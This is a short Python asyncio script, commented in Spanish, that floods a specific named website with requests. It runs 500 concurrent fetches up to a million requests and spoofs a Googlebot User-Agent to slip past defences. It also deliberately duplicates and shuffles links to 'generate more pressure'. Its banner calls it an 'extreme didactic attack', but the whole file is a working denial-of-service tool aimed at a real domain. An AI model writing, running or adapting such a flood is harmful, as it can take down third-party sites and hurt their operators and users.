import asyncio
import httpx
from bs4 import BeautifulSoup
import random

URL_INICIAL = "https://boanorte.es"
CONCURRENCY = 500
MAX_REQUESTS = 1000000  # por si quieres un tope brutal

visited = set()
sem = asyncio.Semaphore(CONCURRENCY)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Cache-Control": "no-cache"
}

async def fetch(client, url):
    try:
        async with sem:
            r = await client.get(url, headers=HEADERS, timeout=5)
            print(f"✅ {r.status_code} - {url}")
            return r.text
    except Exception as e:
        print(f"❌ {url} -> {e}")
        return None

async def crawl(client, url, depth=0):
    if len(visited) >= MAX_REQUESTS:
        return
    visited.add(url)
    html = await fetch(client, url)
    if not html:
        return

    soup = BeautifulSoup(html, "html.parser")
    links = []

    for tag in soup.find_all(["a", "link", "script", "img", "iframe"], href=True):
        href = tag.get("href") or tag.get("src")
        if href:
            if href.startswith("/"):
                href = URL_INICIAL + href
            if href.startswith("http"):
                links.append(href)

    # Duplicamos y mezclamos para generar más presión con peticiones redundantes
    links = list(set(links)) * 3
    random.shuffle(links)

    tasks = [crawl(client, link, depth + 1) for link in links[:CONCURRENCY]]
    await asyncio.gather(*tasks)

async def main():
    print(f"\n🚨 INICIANDO ATAQUE DIDÁCTICO EXTREMO: {URL_INICIAL}")
    async with httpx.AsyncClient(http2=True, follow_redirects=True, timeout=10) as client:
        await crawl(client, URL_INICIAL)

    print(f"\n📦 Total peticiones realizadas: {len(visited)}")

if __name__ == "__main__":
    asyncio.run(main())
